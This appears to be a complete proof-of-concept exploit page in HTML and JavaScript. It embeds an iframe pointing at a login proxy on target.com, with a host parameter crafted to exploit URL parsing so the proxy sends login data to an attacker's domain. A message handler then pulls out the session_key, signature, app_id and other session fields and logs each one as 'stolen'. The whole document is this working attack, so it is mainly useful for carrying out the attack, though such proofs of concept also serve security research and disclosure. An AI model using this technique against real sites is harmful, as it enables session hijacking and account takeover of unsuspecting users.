<!DOCTYPE html>
<html>
    <head>
        <script type="text/javascript" src="https://target.com/js/loader.js"></script>
    </head>
<body>


<iframe src="https://target.com/proxy?app_id=619159&host=http%3A%2F%2F3vulnerable.target.com%3Aa%40myhost.com&resource=getLoginStatus"></iframe>


<script>
window.onmessage = function (e) {

var stolen_data = e.data.toString();

if(stolen_data.includes('app_id'))
{
console.log("stolen data:")
var stolen_data1 = decodeURIComponent(stolen_data.split('&')[1]);

var stolen_data2 = stolen_data1.split('&');


var session_key = stolen_data2[5];
var sig = stolen_data2[10];
var window_id = stolen_data2[9];
var vid = stolen_data2[8];
var is_app_user = stolen_data2[3];
var oid = stolen_data2[4];
var ext_perm = stolen_data2[2];
var exp = stolen_data2[1];
var app_id = decodeURIComponent(stolen_data).split('&')[1].split('=')[2];

console.log("Your stolen sig = "+sig);
console.log("Your stolen session_key = "+session_key);
console.log("Your stolen window_id = "+window_id);
console.log("Your stolen vid = "+vid);
console.log("Your stolen is_app_user = "+is_app_user);
console.log("Your stolen oid = "+oid);
console.log("Your stolen ext_perm = "+ext_perm);
console.log("Your stolen exp = "+exp);
console.log("Your stolen app_id = "+app_id);

console.log("all stolen data:");
console.log(stolen_data2);

}
};
</script>
</body>
</html>
